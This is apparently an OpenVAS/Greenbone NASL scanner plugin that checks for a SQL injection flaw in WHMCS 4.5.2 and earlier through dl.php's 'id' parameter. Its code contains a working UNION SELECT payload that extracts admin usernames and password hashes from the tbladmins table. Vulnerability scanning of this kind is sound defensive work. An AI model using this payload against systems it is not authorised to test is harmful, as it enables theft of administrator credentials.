# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:whmcs:whmcompletesolution";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803197");
  script_version("2022-04-01T05:47:35+0000");
  script_tag(name:"last_modification", value:"2022-04-01 05:47:35 +0000 (Fri, 01 Apr 2022)");
  script_tag(name:"creation_date", value:"2013-05-14 11:27:14 +0530 (Tue, 14 May 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("WHMCS <= 4.5.2 SQLi Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_whmcs_http_detect.nasl");
  script_mandatory_keys("whmcs/http_detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"WHMCS is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to improper sanitation of user supplied input
  via the 'id' parameter to dl.php.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to disclose
  credentials or manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"WHMCS version 4.5.2 and prior.");

  script_tag(name:"solution", value:"Update to version 5.2 or later.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121613");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/whmcs-452-sql-injection");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/dl.php?type=i&amp;id=1 and 0x0=0x1 union select 1,2,3,4," +
            "CONCAT(username,0x3a3a3a,password),6,7 from tbladmins --";

if (http_vuln_check(port: port, url: url, check_header: TRUE, pattern: "filename=*.pdf",
                    extra_check: make_list("CreationDate", "ViewerPreferences"))) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
